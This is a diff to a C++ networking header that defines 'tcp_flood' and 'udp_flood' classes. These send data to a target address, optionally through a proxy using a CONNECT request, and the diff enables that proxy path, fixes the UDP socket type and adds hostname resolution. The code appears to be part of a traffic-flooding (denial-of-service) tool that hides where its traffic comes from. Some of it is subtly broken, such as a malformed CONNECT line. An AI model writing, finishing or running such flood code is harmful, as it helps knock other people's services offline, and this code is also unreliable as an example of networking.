@@ -11,10 +11,12 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <iostream>
+#include <memory>
+#include <netdb.h>
 
 #define MAX_QUERIES 2048
-#define PROXY_CONNECT_FMT "CONNECT %s:%hu %s"
-#define PROXY_CONNECT_MIN_SIZE ::net::__detail__::consteval_strlen(PROXY_CONNECT_FMT) - 7
+#define PROXY_CONNECT "CONNECT"
+#define PROXY_CONNECT_SIZE ::net::__detail__::consteval_strlen(PROXY_CONNECT)
 #define ADDRESS_MAX_LEN ::net::__detail__::consteval_strlen("255.255.255.255:65535")
 
 namespace net
@@ -41,10 +43,10 @@ namespace net
 	class inet_address
 	{
 	public:
-		inet_address(in_addr_t __address, in_port_t __port) : address{AF_INET, ::htons(__port), in_addr{__address}}
+		inline inet_address(in_addr_t __address, in_port_t __port) : address{AF_INET, ::htons(__port), in_addr{__address}}
 		{ }
 		
-		inet_address(std::string __address) : address{AF_INET}
+		inline inet_address(std::string __address) : address{AF_INET}
 		{
 			in_port_t port = 80;
 			if (__address.starts_with("ftp://"))
@@ -117,14 +119,19 @@ namespace net
 			
 			address.sin_port = ::htons(port);
 			::inet_aton(__address.substr(0, colonpos - 1).c_str(), &address.sin_addr);
+			if (address.sin_addr.s_addr == 0)
+			{
+				auto addr_list = *reinterpret_cast<in_addr**>(::gethostbyname(__address.substr(0, colonpos - 1).c_str())->h_addr_list);
+				address.sin_addr = addr_list[0];
+			}
 		}
 		
-		[[nodiscard]] std::string& get_ip() const
+		[[nodiscard]] inline std::string get_ip() const
 		{
-			return *new std::string(::inet_ntoa(address.sin_addr));
+			return {::inet_ntoa(address.sin_addr)};
 		}
 		
-		[[nodiscard]] in_port_t get_port() const
+		[[nodiscard]] inline in_port_t get_port() const
 		{
 			return ::htons(address.sin_port);
 		}
@@ -140,44 +147,48 @@ namespace net
 	class tcp_flood
 	{
 	public:
-		inline tcp_flood(const inet_address& address, const std::string& data, bool debug = false, const inet_address* proxy = nullptr)
+		inline tcp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
 				: address(address), socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_IP))
 		{
-			if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
-				status = false;
-			
-			/*if (proxy)
+			if (proxy)
 			{
-				auto tmp = address.get_port();
-				size_t port_radix = 0;
-				while (tmp > 0)
-				{
-					tmp /= 10;
-					++port_radix;
-				}
-				std::string proxy_request;
-				proxy_request.resize(PROXY_CONNECT_MIN_SIZE + address.get_ip().size() + port_radix + data.size() + 1);
-				::sprintf(proxy_request.data(), PROXY_CONNECT_FMT, address.get_ip().c_str(), address.get_port(), data.c_str());
-				if (::send(socket, proxy_request.c_str(), proxy_request.size(), 0) < 0)
+				if (::connect(socket, reinterpret_cast<const sockaddr*>(&proxy->address), sizeof proxy->address) < 0)
+					status = false;
+				
+				std::string req_buf(PROXY_CONNECT " ");
+				req_buf += address.get_ip();
+				req_buf += ':';
+				req_buf += std::to_string(address.get_port());
+				req_buf += data;
+				
+				if (::send(socket, req_buf.c_str(), req_buf.size(), 0) < 0)
 					status = false;
 			}
-			else*/ if (::send(socket, data.c_str(), data.size(), 0) < 0)
-				status = false;
-			
-			char tmp[128];
-			size_t recved;
-			if (debug)
-				std::cout << "data = R\"(";
-			for (size_t i = 0; ::recv(socket, tmp, 128, MSG_DONTWAIT) &&
-							   (errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+			else
 			{
-				::usleep(1000);
-				if (debug)
-					std::cout.write(tmp, recved);
+				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
+					status = false;
+				
+				if (::send(socket, data.c_str(), data.size(), 0) < 0)
+					status = false;
 			}
-			if (debug)
-				std::cout << ")\"\n";
-			std::cout.flush();
+			
+			::sleep(1);
+
+//			std::array<char, 128> tmp{ };
+//			size_t recved;
+//			if (debug)
+//				std::cout << "data = R\"(";
+//			for (size_t i = 0; ((recved = ::recv(socket, tmp.data(), 128, MSG_DONTWAIT) >= 0) ||
+//								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+//			{
+//				::usleep(1000);
+//				if (debug)
+//					std::cout.write(tmp.data(), std::min(recved, tmp.size()));
+//			}
+//			if (debug)
+//				std::cout << ")\"\n";
+//			std::cout.flush();
 		}
 		
 		inline operator bool()
@@ -199,47 +210,43 @@ namespace net
 	class udp_flood
 	{
 	public:
-		inline udp_flood(const inet_address& address, const std::string& data, bool debug = false, const inet_address* proxy = nullptr)
-				: address(address), socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_IP))
+		inline udp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
+				: address(address), socket(::socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))
 		{
-			/*if (proxy)
+			if (proxy)
 			{
-				auto tmp = address.get_port();
-				size_t port_radix = 0;
-				while (tmp > 0)
-				{
-					tmp /= 10;
-					++port_radix;
-				}
-				std::string proxy_request;
-				proxy_request.resize(PROXY_CONNECT_MIN_SIZE + address.get_ip().size() + port_radix + data.size() + 1);
-				::sprintf(proxy_request.data(), PROXY_CONNECT_FMT, address.get_ip().c_str(), address.get_port(), data.c_str());
-				if (::sendto(
-						socket, proxy_request.c_str(), proxy_request.size(), 0, reinterpret_cast<const sockaddr*>(&address.address),
-						sizeof address.address
-				) < 0)
+				std::string req_buf(PROXY_CONNECT " ");
+				req_buf += address.get_ip();
+				req_buf += ':';
+				req_buf += std::to_string(address.get_port());
+				req_buf += data;
+				
+				if (::sendto(socket, req_buf.c_str(), req_buf.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
+					< 0)
 					status = false;
 			}
-			else*/ if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
-					   < 0)
+			else if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
+					 < 0)
 				status = false;
 			
-			char tmp[128];
-			auto addr = address.address;
-			socklen_t len;
-			size_t recved;
-			if (debug)
-				std::cout << "data = R\"(";
-			for (size_t i = 0; (recved = ::recvfrom(socket, tmp, 128, MSG_DONTWAIT, reinterpret_cast<sockaddr*>(&addr), &len)) >= 0 &&
-							   (errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
-			{
-				::usleep(1000);
-				if (debug)
-					std::cout.write(tmp, recved);
-			}
-			if (debug)
-				std::cout << ")\"\n";
-			std::cout.flush();
+			::sleep(1);
+
+//			char tmp[128];
+//			auto addr = address.address;
+//			socklen_t len;
+//			size_t recved;
+//			if (debug)
+//				std::cout << "data = R\"(";
+//			for (size_t i = 0; ((recved = ::recvfrom(socket, tmp, 128, 0, reinterpret_cast<sockaddr*>(&addr), &len)) >= 0 ||
+//								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+//			{
+//				::usleep(1000);
+//				if (debug)
+//					std::cout.write(tmp, recved);
+//			}
+//			if (debug)
+//				std::cout << ")\"\n";
+//			std::cout.flush();
 		}
 		
 		inline operator bool()
